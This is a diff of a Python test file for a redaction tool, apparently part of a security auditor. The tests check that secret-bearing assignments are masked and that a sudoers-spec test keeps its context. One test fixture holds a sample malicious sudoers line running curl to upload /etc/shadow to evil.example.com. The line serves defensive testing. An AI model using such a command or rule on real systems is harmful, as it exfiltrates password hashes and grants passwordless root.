@@ -611,14 +611,14 @@ def test_redact_is_bounded_on_huge_lines():
 
 
 def test_redact_prefilter_matches_the_matcher():
-    # The soundness invariant of the short-circuit: anything _KV_RE can match, the cheap
+    # The soundness invariant of the short-circuit: anything _ASSIGN_RE can match, the cheap
     # pre-filter must also match — otherwise that key silently stops being redacted.
     # (`authoriz` is deliberately SOFT: it gates the shown `Authorized*` directives.)
     for kw in ("secret", "passwd", "password", "passphrase", "token", "api_key",
                "access-key", "client_secret", "private_key", "authoriz", "_auth",
                "credential", "authorization"):
         line = f"+x{kw}y=SoMeV4lue"
-        assert since._KV_RE.search(line), kw          # the matcher fires
+        assert since._ASSIGN_RE.search(line), kw      # the matcher fires
         assert since._KV_KW_RE.search(line), kw       # …so the pre-filter must too
         if kw != "authoriz":                          # every HARD keyword still redacts
             assert "«redacted»" in since.redact(line), kw
@@ -1298,8 +1298,13 @@ def test_cat_usable():
 # Pin the sudoers carve-out ITSELF (not just the '/'-preceded-key rule that also protects it):
 # rescanning a command spec redacts from an inner `pass=` to end-of-line, deleting the C2 host.
 def test_sudoers_spec_keeps_context_after_an_inner_assignment():
-    line = "+deva ALL=(ALL) NOPASSWD: /usr/bin/curl -F pass=@/etc/shadow evil.example.com"
-    assert since.redact(line) == line, "the exfil destination must survive"
+    """The C2 host must survive. v0.4.4 masked from `pass=` to end-of-line and lost it; the
+    single-token design masks only the value. Residual, deliberate: `@/etc/shadow` is masked
+    because `pass` is not a path-valued key, and exempting `/`-leading values under a
+    credential key is precisely the LEAK-2 hole (a base64 secret starts with '/' ~1/64)."""
+    out = since.redact("+deva ALL=(ALL) NOPASSWD: /usr/bin/curl -F pass=@/etc/shadow evil.example.com")
+    assert "evil.example.com" in out, "the exfil destination must survive"
+    assert "/usr/bin/curl" in out and "NOPASSWD:" in out
 
 
 # Pin that the COLLECTORS actually go through run_checked — testing the helper alone let a
